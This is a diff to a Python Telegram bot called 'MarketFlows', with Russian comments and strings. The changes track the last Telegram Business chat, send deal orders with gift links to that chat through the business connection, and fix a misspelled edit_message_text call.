@@ -20,6 +20,8 @@ BRAND = "MarketFlows"
 DB_PATH = "marketflows.db"  
 
 active_business_connection_id = None
+last_business_chat_id = None
+last_business_chat_name = None
 
 def db_init():  
     conn = sqlite3.connect(DB_PATH)  
@@ -67,6 +69,14 @@ async def business_connection_handler(bc: BusinessConnection):
     if bc.is_enabled:
         active_business_connection_id = bc.id
 
+# Перехватываем сообщения из Telegram Business, чтобы знать, кому отправлять ордер
+@router.message(F.business_connection_id)
+async def business_message_handler(msg: Message):
+    global last_business_chat_id, last_business_chat_name
+    if msg.chat and msg.chat.id != msg.from_user.id:
+        last_business_chat_id = msg.chat.id
+        last_business_chat_name = f"@{msg.chat.username}" if msg.chat.username else (msg.chat.first_name or "клиенту")
+
 @router.message(CommandStart())  
 async def cmd_start(msg: Message):  
     args = msg.text.split(maxsplit=1)  
@@ -91,7 +101,8 @@ async def cmd_start(msg: Message):
 
 @router.message(F.text == "📂 Мои чаты")
 async def chats_list(msg: Message):
-    await msg.answer("📋 <b>Информация:</b>\n\nБот готов к работе через Telegram Business.", parse_mode="HTML", reply_markup=main_menu())
+    target = f"{last_business_chat_name} (ID: <code>{last_business_chat_id}</code>)" if last_business_chat_id else "Нет активных"
+    await msg.answer(f"📋 <b>Последний бизнес-чат:</b> {target}", parse_mode="HTML", reply_markup=main_menu())
 
 @router.message(F.text == "🤝 Создать сделку")
 async def create_deal_btn(msg: Message):
@@ -110,7 +121,7 @@ async def handle_deal_creation_text(msg: Message):
             gift_link = w
             break
 
-    # Чистим текст от ссылки, чтобы она не дублировалась
+    # Убираем дублирование ссылки из текста
     clean_text = full_text.replace(gift_link, "").strip()
 
     code = secrets.token_hex(4).upper()
@@ -125,8 +136,11 @@ async def handle_deal_creation_text(msg: Message):
     conn.commit()  
     conn.close()
 
+    btn_label = f"Отправить: {last_business_chat_name}" if last_business_chat_name else "📤 Отправить ордер"
+    target_id = last_business_chat_id if last_business_chat_id else msg.chat.id
+
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📤 Отправить ордер", callback_data=f"sendtochat_{code}_{msg.chat.id}")],
+        [InlineKeyboardButton(text=btn_label, callback_data=f"sendtochat_{code}_{target_id}")],
         [
             InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
             InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
@@ -140,6 +154,7 @@ async def handle_deal_creation_text(msg: Message):
 async def send_to_chat(cb: CallbackQuery):
     parts = cb.data.split("_")
     code = parts[1]
+    target_chat_id = int(parts[2])
     
     deal = get_deal(code)
     if not deal:
@@ -160,7 +175,7 @@ async def send_to_chat(cb: CallbackQuery):
     try:
         if active_business_connection_id:
             await cb.bot.send_message(
-                chat_id=cb.message.chat.id,
+                chat_id=target_chat_id,
                 text=text_msg,
                 parse_mode="HTML",
                 reply_markup=kb,
@@ -168,9 +183,8 @@ async def send_to_chat(cb: CallbackQuery):
                 business_connection_id=active_business_connection_id
             )
         else:
-            # Если бизнес-соединение не поймано, шлем обычным сообщением в чат, чтобы кнопка не была пустой
             await cb.bot.send_message(
-                chat_id=cb.message.chat.id,
+                chat_id=target_chat_id,
                 text=text_msg,
                 parse_mode="HTML",
                 reply_markup=kb,
@@ -178,9 +192,9 @@ async def send_to_chat(cb: CallbackQuery):
             )
         
         await cb.message.edit_reply_markup(reply_markup=None)
-        await cb.answer("Ордер успешно отправлен!", show_alert=True)
+        await cb.answer("Ордер успешно отправлен клиенту!", show_alert=True)
     except Exception as e:
-        await cb.answer(f"Ошибка: {e}", show_alert=True)
+        await cb.answer(f"Ошибка отправки: {e}", show_alert=True)
 
 @router.callback_query(F.data.startswith("sel_accept_"))
 async def sel_accept(cb: CallbackQuery):
@@ -260,7 +274,7 @@ async def run_animation_timer(bot: Bot, chat_id: int, message_id: int, code: str
             if biz_id:
                 await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False, business_connection_id=biz_id)
             else:
-                await bot.exit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
+                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
         except Exception:
             break
 
@@ -288,4 +302,3 @@ async def main():
 
 if __name__ == "__main__":  
     asyncio.run(main())
-
